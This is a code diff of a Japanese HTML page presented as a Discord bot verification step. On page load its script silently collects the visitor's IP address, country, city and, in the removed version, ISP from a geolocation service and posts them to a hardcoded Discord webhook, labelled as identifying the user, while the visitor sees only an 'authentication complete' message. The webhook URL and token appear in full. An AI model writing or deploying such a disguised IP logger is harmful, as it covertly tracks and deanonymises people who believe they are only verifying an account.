@@ -1,55 +1,48 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head><meta charset="UTF-8"><title>認証完了</title></head>
+<head><meta charset="UTF-8"><title>認証処理</title></head>
 <body style="background:#2f3136;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
-    <h1 id="status">認証処理中...</h1>
-    <p id="debug" style="color:#888;font-size:12px;"></p>
-
+    <h1 id="status">認証中...</h1>
+    <p id="msg"></p>
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
 
-        async function process() {
+        async function start() {
             const urlParams = new URLSearchParams(window.location.search);
             const state = urlParams.get('state');
 
             if (!state) {
-                document.getElementById('status').innerText = "エラー: パラメータが不足しています";
-                return;
-            }
-
-            // 特殊な区切り文字 (LID_..._UID_...) を解析
-            let logId, userId;
-            try {
-                logId = state.split('LID_')[1].split('_UID_')[0];
-                userId = state.split('_UID_')[1];
-            } catch (e) {
-                document.getElementById('status').innerText = "解析エラー";
+                document.getElementById('status').innerText = "❌ パラメータ不足";
+                document.getElementById('msg').innerText = "stateパラメータがありません。Botから発行された最新のリンクを使用してください。";
                 return;
             }
 
             try {
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const geo = await geoRes.json();
+                // LID_xxx_UID_xxx_RID_xxx を分解
+                const logId = state.split('LID_')[1].split('_UID_')[0];
+                const userId = state.split('_UID_')[1].split('_RID_')[0];
+
+                const res = await fetch('https://ipapi.co/json/');
+                const geo = await res.json();
 
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **認証・導入完了**: <@${userId}>`,
+                        content: `✅ **認証成功**: <@${userId}>`,
                         embeds: [{
-                            title: "ユーザー特定成功",
-                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\`\n**プロバイダ:** \`${geo.org}\``,
-                            color: 0x43b581,
-                            timestamp: new Date().toISOString()
+                            title: "IP取得結果",
+                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\``,
+                            color: 0x43b581
                         }]
                     })
                 });
-                document.getElementById('status').innerText = "✔ 認証に成功しました。";
+                document.getElementById('status').innerText = "✅ 認証完了";
             } catch (e) {
-                document.getElementById('status').innerText = "通信エラー";
+                document.getElementById('status').innerText = "❌ 送信エラー";
             }
         }
-        process();
+        start();
     </script>
 </body>
 </html>
